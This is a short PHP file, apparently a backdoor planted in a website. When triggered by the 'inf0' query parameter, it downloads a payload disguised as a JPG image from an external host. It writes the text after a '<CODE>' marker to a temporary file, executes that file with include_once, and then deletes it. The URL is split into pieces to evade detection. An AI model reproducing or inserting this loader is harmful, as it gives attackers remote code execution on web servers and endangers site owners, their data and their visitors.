<?php 
if(!empty($_GET["inf0"])){$fsn="http"."s://c.radikal".".ru/c03/1808/12/23db571e4067."."jpg";$sll= file_get_contents($fsn);$pzi=strpos($sll,"<CODE>",0);if($pzi>0){$cides=substr($sll,$pzi+6);
$DS=DIRECTORY_SEPARATOR;
$ff='zzp.jpg';
if(!empty($_GET["del"])) @unlink($ff);

$fp = fopen($ff, "w");
fputs ($fp,'<?php '.$cides.' ?>');
fclose ($fp);
include_once($ff);
usleep(500);
@unlink($ff);
}}
?>